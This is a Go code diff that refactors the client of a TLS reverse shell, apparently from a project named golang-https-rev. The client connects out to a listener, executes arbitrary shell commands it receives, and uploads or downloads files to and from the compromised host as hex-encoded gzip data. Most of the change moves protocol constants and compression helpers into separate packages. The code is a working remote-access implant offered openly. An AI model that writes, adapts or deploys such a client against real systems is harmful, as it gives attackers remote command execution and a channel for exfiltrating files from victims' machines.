@@ -2,10 +2,7 @@ package client
 
 import (
 	"bufio"
-	"bytes"
-	"compress/gzip"
 	"crypto/tls"
-	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -15,9 +12,13 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"golang-https-rev/pkg/compression"
+	"golang-https-rev/pkg/protocol"
 )
 
-// ReverseClient represents a reverse shell client
+// ReverseClient represents a reverse shell client that connects to a listener
+// and handles command execution and file transfers.
 type ReverseClient struct {
 	target            string
 	conn              *tls.Conn
@@ -26,31 +27,6 @@ type ReverseClient struct {
 	isConnected       bool
 	currentUploadPath string
 	uploadChunks      []string
-}
-
-func compressToHex(data []byte) (string, error) {
-	var buf bytes.Buffer
-	gz := gzip.NewWriter(&buf)
-	if _, err := gz.Write(data); err != nil {
-		return "", err
-	}
-	if err := gz.Close(); err != nil {
-		return "", err
-	}
-	return hex.EncodeToString(buf.Bytes()), nil
-}
-
-func decompressHex(payload string) ([]byte, error) {
-	compressed, err := hex.DecodeString(payload)
-	if err != nil {
-		return nil, err
-	}
-	gz, err := gzip.NewReader(bytes.NewReader(compressed))
-	if err != nil {
-		return nil, err
-	}
-	defer gz.Close()
-	return io.ReadAll(gz)
 }
 
 // NewReverseClient creates a new reverse client
@@ -69,12 +45,12 @@ func (rc *ReverseClient) Connect() error {
 	log.Printf("Connecting to listener at %s...", rc.target)
 	conn, err := tls.Dial("tcp", rc.target, tlsConfig)
 	if err != nil {
-		return fmt.Errorf("failed to connect to listener: %v", err)
+		return fmt.Errorf("failed to connect to listener: %w", err)
 	}
 
 	rc.conn = conn
-	rc.reader = bufio.NewReaderSize(conn, 1024*1024) // allow large commands (chunked uploads)
-	rc.writer = bufio.NewWriterSize(conn, 1024*1024)
+	rc.reader = bufio.NewReaderSize(conn, protocol.BufferSize1MB)
+	rc.writer = bufio.NewWriterSize(conn, protocol.BufferSize1MB)
 	rc.isConnected = true
 
 	log.Println("Connected to listener successfully")
@@ -118,7 +94,7 @@ func (rc *ReverseClient) HandleCommands() error {
 
 	for {
 		// Set read deadline to allow graceful shutdown
-		rc.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+		rc.conn.SetReadDeadline(time.Now().Add(protocol.ReadTimeout * time.Second))
 		line, err := rc.reader.ReadString('\n')
 		rc.conn.SetReadDeadline(time.Time{})
 
@@ -126,7 +102,7 @@ func (rc *ReverseClient) HandleCommands() error {
 
 		if errors.Is(err, bufio.ErrBufferFull) {
 			// Command line exceeded buffer; keep accumulating until newline
-			if cmdBuffer.Len() > 10*1024*1024 { // prevent unbounded growth
+			if cmdBuffer.Len() > protocol.MaxBufferSize {
 				cmdBuffer.Reset()
 			}
 			continue
@@ -139,7 +115,7 @@ func (rc *ReverseClient) HandleCommands() error {
 			if netErr, ok := err.(interface{ Timeout() bool }); ok && netErr.Timeout() {
 				continue
 			}
-			return fmt.Errorf("read error: %v", err)
+			return fmt.Errorf("read error: %w", err)
 		}
 
 		command := strings.TrimSpace(cmdBuffer.String())
@@ -149,23 +125,23 @@ func (rc *ReverseClient) HandleCommands() error {
 		}
 
 		// Handle keepalive ping
-		if command == "PING" {
-			rc.writer.WriteString("PONG\n<<<END_OF_OUTPUT>>>\n")
+		if command == protocol.CmdPing {
+			rc.writer.WriteString(protocol.CmdPong + "\n" + protocol.EndOfOutputMarker + "\n")
 			rc.writer.Flush()
 			continue
 		}
 
 		log.Printf("Received command: %s", command)
 
-		if command == "exit" {
+		if command == protocol.CmdExit {
 			return nil
 		}
 
 		// handle file transfers before shell execution
-		if strings.HasPrefix(command, "START_UPLOAD ") {
+		if strings.HasPrefix(command, protocol.CmdStartUpload+" ") {
 			parts := strings.SplitN(command, " ", 3)
 			if len(parts) != 3 {
-				rc.writer.WriteString("Invalid start_upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.WriteString("Invalid start_upload command\n" + protocol.EndOfOutputMarker + "\n")
 				rc.writer.Flush()
 				continue
 			}
@@ -173,28 +149,28 @@ func (rc *ReverseClient) HandleCommands() error {
 			// Store the path for chunk collection
 			rc.currentUploadPath = remotePath
 			rc.uploadChunks = []string{}
-			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
+			rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
 			rc.writer.Flush()
 			continue
 		}
 
-		if strings.HasPrefix(command, "UPLOAD_CHUNK ") {
+		if strings.HasPrefix(command, protocol.CmdUploadChunk+" ") {
 			if rc.currentUploadPath == "" {
-				rc.writer.WriteString("No active upload\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.WriteString("No active upload\n" + protocol.EndOfOutputMarker + "\n")
 				rc.writer.Flush()
 				continue
 			}
-			chunk := strings.TrimPrefix(command, "UPLOAD_CHUNK ")
+			chunk := strings.TrimPrefix(command, protocol.CmdUploadChunk+" ")
 			rc.uploadChunks = append(rc.uploadChunks, chunk)
-			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
+			rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
 			rc.writer.Flush()
 			continue
 		}
 
-		if strings.HasPrefix(command, "END_UPLOAD ") {
+		if strings.HasPrefix(command, protocol.CmdEndUpload+" ") {
 			parts := strings.SplitN(command, " ", 2)
 			if len(parts) != 2 {
-				rc.writer.WriteString("Invalid end_upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.WriteString("Invalid end_upload command\n" + protocol.EndOfOutputMarker + "\n")
 				rc.writer.Flush()
 				continue
 			}
@@ -202,16 +178,16 @@ func (rc *ReverseClient) HandleCommands() error {
 
 			// Reconstruct and write file
 			fullData := strings.Join(rc.uploadChunks, "")
-			data, err := decompressHex(fullData)
+			data, err := compression.DecompressHex(fullData)
 			if err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				rc.currentUploadPath = ""
 				rc.uploadChunks = []string{}
 				continue
 			}
 			if err := os.WriteFile(remotePath, data, 0644); err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				rc.currentUploadPath = ""
 				rc.uploadChunks = []string{}
@@ -225,59 +201,59 @@ func (rc *ReverseClient) HandleCommands() error {
 		}
 
 		// handle file transfers before shell execution
-		if strings.HasPrefix(command, "UPLOAD ") {
+		if strings.HasPrefix(command, protocol.CmdUpload+" ") {
 			parts := strings.SplitN(command, " ", 3)
 			if len(parts) != 3 {
-				rc.writer.WriteString("Invalid upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.WriteString("Invalid upload command\n" + protocol.EndOfOutputMarker + "\n")
 				rc.writer.Flush()
 				continue
 			}
 			remotePath := parts[1]
 			payload := parts[2]
-			data, err := decompressHex(payload)
+			data, err := compression.DecompressHex(payload)
 			if err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				continue
 			}
 			if err := os.WriteFile(remotePath, data, 0644); err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				continue
 			}
-			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n<<<END_OF_OUTPUT>>>\n", len(data), remotePath))
+			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n"+protocol.EndOfOutputMarker+"\n", len(data), remotePath))
 			rc.writer.Flush()
 			continue
 		}
 
-		if strings.HasPrefix(command, "DOWNLOAD ") {
+		if strings.HasPrefix(command, protocol.CmdDownload+" ") {
 			parts := strings.SplitN(command, " ", 2)
 			if len(parts) != 2 {
-				rc.writer.WriteString("Invalid download command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.WriteString("Invalid download command\n" + protocol.EndOfOutputMarker + "\n")
 				rc.writer.Flush()
 				continue
 			}
 			remotePath := parts[1]
 			data, err := os.ReadFile(remotePath)
 			if err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Read error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Read error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				continue
 			}
-			encoded, err := compressToHex(data)
+			encoded, err := compression.CompressToHex(data)
 			if err != nil {
-				rc.writer.WriteString(fmt.Sprintf("Encode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.WriteString(fmt.Sprintf("Encode error: %v\n"+protocol.EndOfOutputMarker+"\n", err))
 				rc.writer.Flush()
 				continue
 			}
-			rc.writer.WriteString(fmt.Sprintf("DATA %s\n<<<END_OF_OUTPUT>>>\n", encoded))
+			rc.writer.WriteString(fmt.Sprintf(protocol.DataPrefix+"%s\n"+protocol.EndOfOutputMarker+"\n", encoded))
 			rc.writer.Flush()
 			continue
 		}
 
 		output := rc.ExecuteCommand(command)
 		rc.writer.WriteString(output)
-		rc.writer.WriteString("<<<END_OF_OUTPUT>>>\n")
+		rc.writer.WriteString(protocol.EndOfOutputMarker + "\n")
 		rc.writer.Flush()
 	}
 }
